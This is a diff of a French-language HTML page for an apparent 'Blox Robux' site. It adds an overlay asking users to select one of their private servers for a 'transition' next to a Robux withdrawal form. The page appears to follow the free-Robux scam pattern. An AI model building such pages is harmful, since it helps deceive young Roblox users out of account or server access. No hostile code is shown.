@@ -9,6 +9,20 @@
 </head>
 
 <body>
+    <div class="background" id="background">
+    <div class="Interface" id="finalStep">
+      <p class="explain" id="explain">
+        Veuillez selectionner un de vos serveurs prives pour effectuer votre transition.
+        Si aucun serveur n'apparait, veuillez cliquer sur le bouton si dessous.
+      </p>
+      <button>Besoin d'aide ?</button>
+        <div class="private-servers">
+          <select id="private-servers">
+            <option>Séléctionne un serveur</option>
+          </select>
+      </div>
+    </div>
+  </div>
   <header>
   <div class="header-left">
     <a href="../index.html">
@@ -35,7 +49,6 @@
       <p class="desc">
         Entrez le montant de Robux à retirer depuis votre solde ci-dessus.
       </p>
-
       <div class="actions">
         <input id="amount" type="number" placeholder="Montant à retirer (ex : 50)" />
         <button id="withdrawBtn">Retirer</button>
@@ -50,11 +63,6 @@
   <div id="transition" class="fade-transition active">
     <img src="../img/Robux.png" id="image" alt="Logo Blox Robux" />
     <div class="text" id="text-chargement">Chargement...</div>
-  </div>
-  <div class="private-servers">
-    <select id="private-servers">
-      <option></option>
-    </select>
   </div>
   <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
